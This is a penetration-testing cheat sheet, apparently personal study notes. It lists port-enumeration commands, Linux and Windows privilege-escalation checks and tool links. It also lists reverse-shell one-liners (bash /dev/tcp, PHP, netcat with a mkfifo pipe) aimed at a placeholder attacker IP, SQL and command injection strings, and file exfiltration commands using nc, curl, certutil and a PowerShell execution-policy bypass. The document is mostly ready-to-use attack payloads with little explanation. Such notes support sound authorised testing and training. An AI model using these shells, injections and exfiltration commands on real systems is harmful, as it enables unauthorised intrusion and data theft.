   ______      __    __              ____        __         
  / ____/___  / /___/ /__  ____     / __ \__  __/ /__  _____
 / / __/ __ \/ / __  / _ \/ __ \   / /_/ / / / / / _ \/ ___/
/ /_/ / /_/ / / /_/ /  __/ / / /  / _, _/ /_/ / /  __(__  ) 
\____/\____/_/\__,_/\___/_/ /_/  /_/ |_|\__,_/_/\___/____/  

1) If you find a credential set that works somewhere, try it EVERYWHERE!
2) 


==============================================================================================================================
ENUMERATION OF PORTS
==============================================================================================================================

22 - SSH
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Find allowed auth methods

    * Try connecting with wrong pass, look at allowed authentication methods (public key, password, etc.) 
      
   
   
25 - SMTP
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Get usernames and emails of users on box

    * nc <TARGET IP> 25: Attempt connection 
          * VRFY <USERNAME>: Confirm if user exists (only if connected)
     * smtp-users-enum -M VRFY -U <WORDLIST> -t <TARGET IP> : Automates above process
  
  
    
53 - DNS
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Uncover hidden domain names, which can expose different sites 

    * nslookup 
        > SERVER <IP ADDR>
        > <IP ADDR> : Shows the domain associated with the IP 
    * dig 


     
80 - HTTP
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * Use dirbuster/gobuster/Burp Spider to find directories
     * nikto -h http://<IP ADDR>: Scan with Nikto
     * Use Wappalyzer to check for technologies on webpage
   
   
      
111 - RPC
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * rpcclient -U "" <IP ADDR>: Connect anon
     * rpcinfo <IP ADDR>: Get rpc information
     * (Impacket) rpcdump.py <USER>:<PASS>@<IP ADDR> <PORT>



161 (UDP) - SNMP
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * snmpwalk -v 1 -c public <TARGET IP> : View read-only info from SNMPv1 



139/445 - SMB
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * smbclient -L <IP ADDR>: List SMB shares
          * SMB version is listed if connected 
     * nmap --script smb-enum-users.nse -p139 <IP ADDR> : Scan SMB shares, shows where each share is mapped to on the target
     * smbclient //<IP ADDR>/<SHARE NAME> -U ""%"": Connect to SMB share (anonymous)
     * (Impacket) python smbclient.py <USER>:<PASSWORD>@<ID ADDR>: Connect to SMB, needs creds 


3306 - MySQL
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * mysql -u <USERNAME> -p <PASSWORD> -h <TARGET IP> : Connect to MySQL database from Kali 



==============================================================================================================================
REVERSE SHELLS
==============================================================================================================================

TTY Shell Upgrade: python -c 'import pty; pty.spawn("/bin/bash")' 

Listen on Kali: nc -lvp <PORT>

Bash: bash -i >& /dev/tcp/<IP ADDR>/<PORT> 0>&1

PHP: php -r '$sock=fsockopen("<IP ADDR>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

Netcat with -e: nc -e /bin/sh <IP ADDR> <PORT>

Netcat without -e: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP ADDR> <PORT> >/tmp/f

  
==============================================================================================================================
SQL INJECTION STRINGS
==============================================================================================================================
    
' or ''='     

' or ''-

' or '''

blah’ OR 1 = 1 — -

“blah’ OR 1=1 — “

' or 1=1--

' or 1=1#

' or 1=1/*

') or '1'='1--

') or ('1'='1--


USERNAME | PASS
------------------
admin ' | '

' or 1-- | EMPTY

' | ' 

<USERNAME> | blah’ OR 1 = 1 — -


URL Injections
''''''''''''''''''
Try to append ' (single apostrophe) to the end of a ?pagename=home' to see if error returns 



Good Resources
''''''''''''''''''
https://nandtech.co/2017/07/11/penetration-testing-practice-hacking-kioptrix-l3/ : SQL injection through web (MySQL) 



==============================================================================================================================
COMMAND INJECTION STRINGS
==============================================================================================================================

;

; <COMMAND> ;

|

&&


______________________________________________________________________________________________________________________________         
==============================================================================================================================     
██      ██ ███    ██ ██    ██ ██   ██
██      ██ ████   ██ ██    ██  ██ ██
██      ██ ██ ██  ██ ██    ██   ███ 
██      ██ ██  ██ ██ ██    ██  ██ ██  
███████ ██ ██   ████  ██████  ██   ██ 
==============================================================================================================================
                                                  
==============================================================================================================================
LINUX PRIV ESC
==============================================================================================================================

Common Vectors
'''''''''''''

1) Kernel Exploit 
    * Check with uname -a AND lsb_release -a 
    * Search for possible kernel exploit 
    * Transfer + compile
    * Exploit
    
2) Running Services
    * Check for root running services with ps aux | grep root, or pspy64

3) SUID
    * Check for files that can run as the owner (root)
    * They can sometimes be exploited to act as root
    * Check https://gtfobins.github.io/ for many binary capabilties
    
4) Cron Jobs
    * Check cron with ls -la /etc/cron.d
    * Can any tasks be written/modified? 
    * Is cron.d directory writable? 
    
5) "." in PATH 
    * Users with "." in path makes it convenient so that "./" does not need to be added before binary
    * This can lead to malicous twin binaries executing


Commands
'''''''''''''
w: Other users logged in 

env: See environmental variables

id: Show id and group membership

uname -a: Machine info, kernel, etc.

lsb_release -a: Show OS info

cat /etc/passwd: View accounts

find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;: Find writable directories
find / -type d -writable 2> /dev/null: Find writable directories

find / -perm -u=s -type f 2>/dev/null: Find SUID files
find / -perm /4000 2>/dev/null

find / -perm -g=s -type f 2>/dev/null: Find GUID files

crontab -l: List cron jobs

ls -la /etc/cron.d: Check cron jobs

mount: View mounted filesystems

which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null: Find compilers, etc. 

netstat -antup: Check open ports 

find / -type f | xargs grep 'password' : Search through files for word "password"
find / -type f | xargs grep 'username' : Search through files for word "username"


Scripts
''''''''''''''
      * linenum.sh
      * suggester.sh 
      * pspy: View processes in real time
      * Linux Smart Enumeration : https://github.com/diego-treitos/linux-smart-enumeration
      * https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py: View SUIDs that are not standard
      
Other
''''''''''''''
     * https://gtfobins.github.io/ : Check capabilities of binaries with this site
     * https://payatu.com/blog_12 : Good linux priv esc article 
     * https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ : Escaping restricted shells
    


==============================================================================================================================
LINUX FILE TRANSFER/EXFILTRATION
==============================================================================================================================

scp <PATH ON KALI> <USERNAME>@<TARGET IP>:<PATH ON TARGET> : Transfer file TO TARGET FROM ATTACKER
scp <USERNAME>@<TARGET IP>:<PATH ON TARGET> <PATH ON KALI> : Transfer file TO ATTACKER FROM TARGET

Netcat:
   ATTACKER: nc -l -p <PORT> > <FILENAME>
   TARGET: nc -w 3 <ATTACKER IP> <PORT> < <FILENAME>

curl -o <FILENAME> http://<ATTACKER IP>/<FILENAME>
 
 
 
 
______________________________________________________________________________________________________________________________           
==============================================================================================================================     
██     ██ ██ ███    ██ ██████   ██████  ██     ██ ███████ 
██     ██ ██ ████   ██ ██   ██ ██    ██ ██     ██ ██
██  █  ██ ██ ██ ██  ██ ██   ██ ██    ██ ██  █  ██ ██████
██ ███ ██ ██ ██  ██ ██ ██   ██ ██    ██ ██ ███ ██      ██
 ███ ███  ██ ██   ████ ██████   ██████   ███ ███  ███████
==============================================================================================================================                                                                                       

==============================================================================================================================
WINDOWS PRIV ESC
==============================================================================================================================

powershell.exe $PSVersionTable.PSVersion: Output powershell version

systeminfo: Get OS + service pack info -> search for exploits

net users: Lists users

Scripts
''''''''''''''
      * jaws
      * powerup.ps1
      * sherlock 
      * powerless (for windows boxes without powershell) - https://github.com/M4ximuss/Powerless
      
Other 
''''''''''''''
     * https://lolbas-project.github.io/ : Windows binaries + capabilities 
     * Check for SCManager misconfig: https://recipeforroot.com/scmanger/ 
     * https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/ : Windows Priv Esc

==============================================================================================================================
WINDOWS FILE TRANSFER/EXFILTRATION
==============================================================================================================================

powershell -nop -exec bypass -command "Invoke-WebRequest -Uri http://<IP ADDR>/<FILE> -Outfile C:\<PATH TO FILE>"     

certutil -urlcache -split -f “http://<KALI IP>/<FILENAME>" <FILENAME TO OUTPUT>

